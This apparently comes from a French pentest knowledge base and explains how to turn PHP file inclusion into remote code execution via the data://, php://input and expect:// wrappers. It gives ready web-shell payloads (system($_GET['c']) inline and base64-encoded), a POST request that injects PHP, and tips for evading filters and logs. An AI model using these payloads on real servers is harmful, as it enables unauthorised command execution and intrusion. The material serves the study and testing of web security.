---
order: 4
title: "Wrappers data://, php://input et expect:// : inclusion directe vers RCE"
description: "Fournir du contenu contrôlé par l'attaquant directement à un include PHP via les wrappers data:// et php://input, et exécution de commandes via expect://, lorsque l'inclusion d'URL distantes est désactivée."
keywords:
  - wrapper data
  - php://input
  - expect://
  - RFI
  - allow_url_include
---

# Wrappers data et input

Lorsqu'un sink `include`/`require` prend une entrée influencée par l'attaquant, plusieurs wrappers permettent de fournir directement le *contenu à exécuter*, sans héberger de fichier distant. Ce sont les escalades privilégiées de LFI vers RCE lorsque l'inclusion de fichier distant classique est bloquée mais que le wrapper pertinent est activé.

## data://

Le wrapper `data://` intègre le contenu directement dans le chemin lui-même. Pointé vers un `include`, il exécute le PHP ainsi intégré :

```
data://text/plain,<?php system($_GET['c']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

`data://` exige `allow_url_include=On`. La forme base64 évite les caractères gênants dans l'URL.

## php://input

`php://input` est le corps brut de la requête. Lorsque le sink l'inclut, placez votre PHP dans le corps POST :

```
POST /?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['c']); ?>
```

Cela nécessite aussi `allow_url_include=On`, mais cela garde le payload hors de l'URL et des journaux, ce qui peut compter pour la discrétion et les limites de longueur.

## expect://

Le wrapper `expect://` exécute une commande via l'extension Expect, de sorte que l'inclusion est une exécution directe de commande :

```
expect://id
```

Cela requiert l'extension PECL `expect` (peu courante) chargée, ce qui en fait un gain situationnel plutôt qu'un premier choix.

## Choisir un vecteur

- Si `allow_url_include=On` : `data://` ou `php://input` donnent une RCE immédiate avec les payloads les plus simples.
- Si `allow_url_include=Off` : ceux-ci sont indisponibles ; basculer vers les [chaînes de filtres vers RCE](filter-chains-to-rce.md) (aucune exigence de configuration) ou la [désérialisation phar](phar-deserialization.md).
- `expect://` uniquement lorsque l'extension est présente.

## Notes d'exploitation

- Confirmer que le sink exécute réellement (un `include`/`require`) et ne fait pas que lire ; un sink de lecture renvoie votre payload sous forme de texte au lieu de l'exécuter.
- Attention aux extensions ajoutées ou aux préfixes de chemin que l'application rajoute, et aux filtres d'entrée sur `php://`, `data:` ou `<?php`, que vous pouvez souvent esquiver par la casse, le base64 (`data://...;base64,`) ou les balises courtes `<?=`.
- Combiner d'abord avec la divulgation de source par [php://filter](php-filter-wrapper.md) pour apprendre exactement comment le sink construit le chemin.

## Outils

- **curl** / Burp Repeater.

## Références

- PHP manual: data://, php://input, supported protocols
- PortSwigger Web Security Academy: LFI to RCE
